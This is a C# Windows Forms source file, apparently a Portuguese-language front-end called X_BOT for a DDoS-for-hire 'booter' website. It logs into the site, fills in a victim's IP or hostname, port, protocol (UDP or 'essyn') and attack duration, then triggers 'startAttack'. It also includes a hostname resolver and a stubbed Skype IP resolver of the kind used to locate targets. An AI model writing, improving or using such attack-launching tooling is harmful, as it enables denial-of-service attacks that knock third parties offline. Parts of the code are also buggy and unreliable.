using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Text.RegularExpressions;
using System.Net;
using System.Net.Sockets;

namespace X_BOT
{
    public partial class X_BOT : Form
    {
        public X_BOT()
        {
            InitializeComponent();
            LABEL_SLIDER_DURACAO.Text = "";
            LABEL_DURACAO_MINUTOS.Text = "";
            LABEL_SLIDER_SEGUNDOS.Text = "";
            COMBOBOX_PROTOCOLO.SelectedIndex = 0;
            LABEL_SLIDER_DURACAO.Text = "15";
            LABEL_SLIDER_SEGUNDOS.Text = "Segundos";
            LABEL_DURACAO_MINUTOS.Text = "(" + "0" + "Minutos)";
            LABEL_IPRESOLVER_IP.Visible = false;
            TEXTBOX_IPRESOLVER_IP.Visible = false;
        }

        private void SLIDER_DURACAO_Scroll(object sender, EventArgs e)
        {
            LABEL_SLIDER_DURACAO.Text = Convert.ToString(SLIDER_DURACAO.Value);
            LABEL_SLIDER_SEGUNDOS.Text = "Segundos";

            int minutos;
            minutos = Convert.ToInt32(LABEL_SLIDER_DURACAO.Text) / 60;

            LABEL_DURACAO_MINUTOS.Text = "(" + Convert.ToString(minutos) + "Minutos)";
        }

        private void RADIOBUTTON_DEFINIR_REPETICOES_CheckedChanged(object sender, EventArgs e)
        {
            if (RADIOBUTTON_DEFINIR_REPETICOES.Checked == true)
            {
                RADIOBUTTON_QUANTIDADE.Visible = true;
                RADIOBUTTON_TEMPO.Visible = true;
            }
        }

        private void RADIOBUTTON_CONTINUO_CheckedChanged(object sender, EventArgs e)
        {
            if (RADIOBUTTON_CONTINUO.Checked == true)
            {
                RADIOBUTTON_QUANTIDADE.Visible = false;
                RADIOBUTTON_TEMPO.Visible = false;
                LABEL_SETA.Visible = false;
                TEXTBOX_QUANTIDADE.Visible = false;
                LABEL_HORAS.Visible = false;
                LABEL_MINUTOS.Visible = false;
                LABEL_SEGUNDOS.Visible = false;
                TEXTBOX_HORAS.Visible = false;
                TEXTBOX_MINUTOS.Visible = false;
                TEXTBOX_SEGUNDOS.Visible = false;
            }
        }

        private void RADIOBUTTON_TEMPO_CheckedChanged(object sender, EventArgs e)
        {
            if (RADIOBUTTON_TEMPO.Checked == true)
            {
                LABEL_HORAS.Visible = true;
                LABEL_MINUTOS.Visible = true;
                LABEL_SEGUNDOS.Visible = true;
                TEXTBOX_HORAS.Visible = true;
                TEXTBOX_MINUTOS.Visible = true;
                TEXTBOX_SEGUNDOS.Visible = true;
                LABEL_SETA.Visible = false;
                TEXTBOX_QUANTIDADE.Visible = false;
            }
        }

        private void RADIOBUTTON_QUANTIDADE_CheckedChanged(object sender, EventArgs e)
        {
            if (RADIOBUTTON_QUANTIDADE.Checked == true)
            {
                LABEL_SETA.Visible = true;
                TEXTBOX_QUANTIDADE.Visible = true;
                LABEL_HORAS.Visible = false;
                LABEL_MINUTOS.Visible = false;
                LABEL_SEGUNDOS.Visible = false;
                TEXTBOX_HORAS.Visible = false;
                TEXTBOX_MINUTOS.Visible = false;
                TEXTBOX_SEGUNDOS.Visible = false;
            }
        }

        private void BUTTON_INICIAR_ATAQUE_Click(object sender, EventArgs e)
        {
            string URL = "";

            URL = BROWSER.Url.ToString();

            #region CASO NAO ESTEJA NA PAGINA DE BOOT
            if (URL == "https://xboot.net/outside.php")
            {
                BROWSER.Document.GetElementById("username").InnerText = TEXTBOX_USERNAME.Text;
                BROWSER.Document.GetElementById("password").InnerText = TEXTBOX_PASSWORD.Text;

                BROWSER.Document.GetElementById("loginButton").InvokeMember("Click");

                BROWSER.Navigate("https://xboot.net/#boot");

                HtmlElementCollection FormAttack = BROWSER.Document.GetElementsByTagName("input");

                for (int i = 0; i < FormAttack.Count; i++)
                {
                    if (RADIOBUTTON_HOSTNAME.Checked == true)
                    {
                        if (FormAttack[i].GetAttribute("id") == "resolverDetails")
                        {
                            if (FormAttack[i].InnerText != "")
                            {
                                FormAttack[i].InnerText = TEXTBOX_HOSTNAME.Text;
                                BROWSER.Document.GetElementById("resolve").InvokeMember("Click");
                            }
                        }
                    }

                    if (RADIOBUTTON_IP.Checked == true)
                    {
                        if (FormAttack[i].GetAttribute("name") == "ip")
                        {
                            if (FormAttack[i].InnerText == "")
                            {
                                FormAttack[i].InnerText = TEXTBOX_IP.Text;
                            }
                        }
                    }

                    if (FormAttack[i].GetAttribute("name") == "port")
                    {
                        if (FormAttack[i].InnerText == "")
                        {
                            FormAttack[i].InnerText = TEXTBOX_PORTA.Text;
                        }
                    }


                }

                HtmlElementCollection FormAttack2 = BROWSER.Document.GetElementsByTagName("option");

                for (int i = 0; i < FormAttack2.Count; i++)
                {
                    if (COMBOBOX_PROTOCOLO.SelectedIndex == 0)
                    {
                        if (FormAttack2[i].GetAttribute("value") == "udp")
                        {
                            if (FormAttack2[i].GetAttribute("selected") == "")
                            {
                                HtmlElementCollection FormAttack3 = BROWSER.Document.GetElementsByTagName("button");

                                for (int o = 0; o < FormAttack3.Count; o++)
                                {
                                    if (FormAttack2[i].GetAttribute("id") == "startAttack")
                                    {
                                        BROWSER.Document.GetElementById("startAttack").InvokeMember("Click");
                                    }
                                }
                            }
                        }
                    }

                    if (COMBOBOX_PROTOCOLO.SelectedIndex == 1)
                    {
                        if (FormAttack2[i].GetAttribute("value") == "udp")
                        {
                            if (FormAttack2[i].GetAttribute("selected") == "")
                            {
                                FormAttack[i].SetAttribute("selected", "");

                                BROWSER.Document.GetElementById("startAttack").InvokeMember("Click");
                            }
                        }
                    }
                }
            }
            #endregion

            #region CASO ESTEJA NA PAGINA DE BOOT
            else
            {
                #region VERIFICAR ENDEREÇO
                if (URL != "https://xboot.net/#boot")
                {
                    BROWSER.Navigate("https://xboot.net/#boot");
                    URL = "https://xboot.net/#boot";
                }
                #endregion

                #region PROCESSAMENTO
                if (URL == "https://xboot.net/#boot")
                {
                    #region PREENCHER CAIXAS DE TEXTO
                    HtmlElementCollection FormAttack = BROWSER.Document.GetElementsByTagName("input");

                    for (int i = 0; i < FormAttack.Count; i++)
                    {
                        if (RADIOBUTTON_HOSTNAME.Checked == true)
                        {
                            if (FormAttack[i].GetAttribute("id") == "resolverDetails")
                            {
                                if (FormAttack[i].InnerText == null)
                                {
                                    FormAttack[i].InnerText = Convert.ToString(TEXTBOX_HOSTNAME.Text);
                                    BROWSER.Document.GetElementById("resolve").InvokeMember("Click");
                                }
                            }
                        }

                        if (RADIOBUTTON_IP.Checked == true)
                        {
                            if (FormAttack[i].GetAttribute("name") == "ip")
                            {
                                if (FormAttack[i].InnerText == null)
                                {
                                    FormAttack[i].InnerText = Convert.ToString(TEXTBOX_IP.Text);
                                }
                            }
                        }

                        if (FormAttack[i].GetAttribute("name") == "port")
                        {
                            if (FormAttack[i].InnerText == null)
                            {
                                FormAttack[i].InnerText = Convert.ToString(TEXTBOX_PORTA.Text);
                            }
                        }

                    }
                    #endregion

                    #region SELECIONAR PROTOCOLO
                    /*HtmlElementCollection FormAttack2 = BROWSER.Document.GetElementsByTagName("option");

                    for (int i = 0; i < FormAttack2.Count; i++)
                    {    
                        if (COMBOBOX_PROTOCOLO.SelectedIndex == 0)
                        {
                            if (FormAttack2[i].GetAttribute("value") == "udp")
                            {
                                if (FormAttack2[i].GetAttribute("selected") == null)
                                {
                                    HtmlElementCollection FormAttack3 = BROWSER.Document.GetElementsByTagName("button");

                                    for (int o = 0; o < FormAttack3.Count; o++)
                                    {
                                        if (FormAttack2[i].GetAttribute("id") == "startAttack")
                                        {
                                            BROWSER.Document.GetElementById("startAttack").InvokeMember("Click");
                                        }
                                    }
                                }
                            }
                        }
                        
                        if (COMBOBOX_PROTOCOLO.SelectedIndex == 1)
                        {
                            if (FormAttack2[i].GetAttribute("value") == "udp")
                            {
                                FormAttack2[i].SetAttribute("selected","false");
                            }

                            if (FormAttack2[i].GetAttribute("value") == "essyn")
                            {
                                FormAttack[i].SetAttribute("selected", "true");
                                BROWSER.Document.GetElementById("startAttack").InvokeMember("Click");
                            }                           
                        }
                    }*/
                    #endregion

                    #region DEFINIR TEMPO DO ATAQUE

                    HtmlElementCollection FormAttack4 = BROWSER.Document.GetElementsByTagName("input");

                    for (int x = 0; x < FormAttack.Count; x++)
                    {
                        if (FormAttack4[x].GetAttribute("id") == "timeVal")
                        {
                            //string segundos = Convert.ToString(LABEL_SEGUNDOS.Text);
                            FormAttack4[x].SetAttribute("value", Convert.ToString(LABEL_SEGUNDOS.Text));
                            //BROWSER.Document.GetElementById("startAttack").InvokeMember("Click");
                        }
                    }
                    #endregion
                }
                #endregion
            }
            #endregion
        }

        private void RADIOBUTTON_HOSTNAME_CheckedChanged(object sender, EventArgs e)
        {
            if (RADIOBUTTON_HOSTNAME.Checked == true)
                TEXTBOX_HOSTNAME.Enabled = true;
            else
                TEXTBOX_HOSTNAME.Enabled = false;
        }

        private void RADIOBUTTON_IP_CheckedChanged(object sender, EventArgs e)
        {
            if (RADIOBUTTON_IP.Checked == true)
                TEXTBOX_IP.Enabled = true;
            else
                TEXTBOX_IP.Enabled = false;
        }

        private void LABEL_HOSTNAME_Click(object sender, EventArgs e)
        {
            RADIOBUTTON_HOSTNAME.Checked = true;
        }

        private void LABEL_IP_Click(object sender, EventArgs e)
        {
            RADIOBUTTON_IP.Checked = true;
        }

        private void TABPAGE_IP_RESOLVER_Enter(object sender, EventArgs e)
        {
            this.Size = new Size(400, 400);
            this.TABCONTROL_OPCOES.Size = new Size(355, 305);
            this.LOGOTIPO.Location = new Point(271, 2);
        }

        private void TABPAGE_BOOT_Enter(object sender, EventArgs e)
        {
            this.Size = new Size(1366, 739);
            this.TABCONTROL_OPCOES.Size = new Size(1323, 648);
            this.LOGOTIPO.Location = new Point(1221, 2);
        }

        private void TABPAGE_SKYPE_RESOLVER_Enter(object sender, EventArgs e)
        {
            this.Size = new Size(400, 400);
            this.TABCONTROL_OPCOES.Size = new Size(355, 305);
            this.LOGOTIPO.Location = new Point(271, 2);
        }

        private void TEXTBOX_IP_KeyPress(object sender, KeyPressEventArgs e)
        {
            if ((e.KeyChar < '0' || e.KeyChar > '9') && e.KeyChar != 8)
                e.Handled = true;
        }

        private void TEXTBOX_PORTA_KeyPress(object sender, KeyPressEventArgs e)
        {
            if ((e.KeyChar < '0' || e.KeyChar > '9') && e.KeyChar != 8)
                e.Handled = true;
        }

        public bool IsValidIP(string addr)
        {
            //create our match pattern
            string pattern = @"^([1-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])(\.([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])){3}$";
            //create our Regular Expression object
            Regex check = new Regex(pattern);
            //boolean variable to hold the status
            bool valid = false;
            //check to make sure an ip address was provided
            if (addr == "")
            {
                //no address provided so return false
                valid = false;
            }
            else
            {
                //address provided so use the IsMatch Method
                //of the Regular Expression object
                valid = check.IsMatch(addr, 0);
            }
            //return the results
            return valid;
        }

        private void BUTTON_PARAR_ATAQUE_Click(object sender, EventArgs e)
        {
            //HtmlElement StartAttack = BROWSER.Document.GetElementById("startAttack");
            //StartAttack.SetAttribute("value", "your text to search");
            //HtmlElement StartAttack = BROWSER.Document.All.GetElementsByName("button")[3];
            //StartAttack.InvokeMember("click");

            var buttonControls = (from HtmlElement element in BROWSER.Document.GetElementsByTagName("button") select element).ToList();

            HtmlElement StartAttack = buttonControls.FirstOrDefault(x => x.Id == "startAttack");
            StartAttack.InvokeMember("Click");

            /*HtmlElementCollection StartAttack = BROWSER.Document.All;
            foreach (HtmlElement element in StartAttack)
            {
                if (element.GetAttribute("id") == "startAttack")
                {
                    element.InvokeMember("click");
                }
            }*/
        }

        public static bool GetResolvedConnecionIPAddress(string serverNameOrURL, out IPAddress resolvedIPAddress)
        {
            bool isResolved = false;
            IPHostEntry hostEntry = null;
            IPAddress resolvIP = null;
            try
            {
                if (!IPAddress.TryParse(serverNameOrURL, out resolvIP))
                {
                    hostEntry = Dns.GetHostEntry(serverNameOrURL);

                    if (hostEntry != null && hostEntry.AddressList != null && hostEntry.AddressList.Length > 0)
                    {
                        if (hostEntry.AddressList.Length == 1)
                        {
                            resolvIP = hostEntry.AddressList[0];
                            isResolved = true;
                        }
                        else
                        {
                            foreach (IPAddress var in hostEntry.AddressList)
                            {
                                if (var.AddressFamily == AddressFamily.InterNetwork)
                                {
                                    resolvIP = var;
                                    isResolved = true;
                                    break;
                                }
                            }
                        }
                    }
                }
                else
                {
                    isResolved = true;
                }
            }
            catch (Exception ex)
            {

            }
            finally
            {
                resolvedIPAddress = resolvIP;
            }

            return isResolved;
        }

        private void BUTTON_RESOLVER_Click(object sender, EventArgs e)
        {
            LABEL_IPRESOLVER_IP.Visible = true;
            TEXTBOX_IPRESOLVER_IP.Visible = true;
            LABEL_IPRESOLVER_IP.Text = LABEL_IPRESOLVER_IP.Text + " " + TEXTBOX_IPRESOLVER_HOSTNAME.Text;
            try
            {
                // Host Name resolution to IP
                IPHostEntry host = Dns.GetHostEntry(TEXTBOX_IPRESOLVER_HOSTNAME.Text.Trim());
                IPAddress[] ipaddr = host.AddressList;
                // Loop through the IP Address array and add the IP address to Listbox
                foreach (IPAddress addr in ipaddr)
                {
                    TEXTBOX_IPRESOLVER_IP.Text = addr.ToString();
                }
            }
            // Catch unknown host names
            catch (System.Net.Sockets.SocketException ex)
            {
                MessageBox.Show(ex.Message);
            }
            catch (System.Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void BUTTON_SKYPERESOLVER_RESOLVER_Click(object sender, EventArgs e)
        {
            WebRequest.Create("" + TEXTBOX_SKYPERESOLVER_NOMESKYPE.Text);
            if (TEXTBOX_SKYPERESOLVER_NOMESKYPE.Text == "")
                MessageBox.Show("Insira um nome Skype", "Campos em Falta", MessageBoxButtons.OK, MessageBoxIcon.Error);
            else
            {
                //TEXTBOX_SKYPERESOLVER_IP = new System.Net.WebClient().DownloadString(TEXTBOX_SKYPERESOLVER_NOMESKYPE);
            }
        }

        #region CodigoAntigo

        /*
            if (TEXTBOX_HOSTNAME.Text != null && TEXTBOX_IP.Text != null)
                BROWSER.Document.GetElementById("resolverDetails").InnerText = TEXTBOX_HOSTNAME.Text;
            if (TEXTBOX_HOSTNAME.Text != null && TEXTBOX_IP.Text == null)
                BROWSER.Document.GetElementById("resolverDetails").InnerText = TEXTBOX_HOSTNAME.Text;
            if (TEXTBOX_HOSTNAME.Text == null && TEXTBOX_IP.Text != null)
            
            BROWSER.Document.GetElementById("input").InnerText = TEXTBOX_IP.Text;
            
            System.Threading.Thread.Sleep(100);
            
            BROWSER.Document.GetElementById("porta").InnerText = TEXTBOX_PORTA.Text;
            System.Threading.Thread.Sleep(100);

            if (COMBOBOX_PROTOCOLO.SelectedIndex == 0)
            {
                BROWSER.Document.GetElementById("type").InvokeMember("Click");
                System.Threading.Thread.Sleep(100);
                BROWSER.Document.GetElementById("udp").InvokeMember("Click");
                System.Threading.Thread.Sleep(100);
            }

            if (COMBOBOX_PROTOCOLO.SelectedIndex == 1)
            {
                BROWSER.Document.GetElementById("type").InvokeMember("Click");
                System.Threading.Thread.Sleep(100);
                BROWSER.Document.GetElementById("essyn").InvokeMember("Click");
                System.Threading.Thread.Sleep(100);
            }

            BROWSER.Document.GetElementById("timeVal").SetAttribute("value", "600");
            System.Threading.Thread.Sleep(200);

            BROWSER.Document.GetElementById("startAttack").InvokeMember("Click");
            */

        #endregion

    }
}
